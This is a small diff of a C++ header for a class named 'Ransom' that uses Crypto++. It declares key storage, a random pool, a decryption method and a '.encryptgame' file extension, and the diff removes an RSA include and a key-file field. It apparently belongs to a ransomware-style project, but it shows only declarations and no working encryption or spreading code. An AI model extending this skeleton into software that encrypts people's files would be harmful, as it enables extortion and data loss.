@@ -1,10 +1,8 @@
 #pragma once
 
-#include <rsa.h>
 #include <files.h>
 #include <osrng.h>
 #include <filesystem>
-#include <rsa.h>
 #include "../cryptopp/modes.h"
 
 class Ransom
@@ -16,8 +14,6 @@ public:
 	void run_decryption_logic();
 
 private:
-	int max_buffer_size = 450;
-	const char* encryption_file_ = "rsakey.der";
 	const char* custom_extension_name = ".encryptgame";
 	CryptoPP::AutoSeededRandomPool rng_;
 	CryptoPP::SecByteBlock* key_;
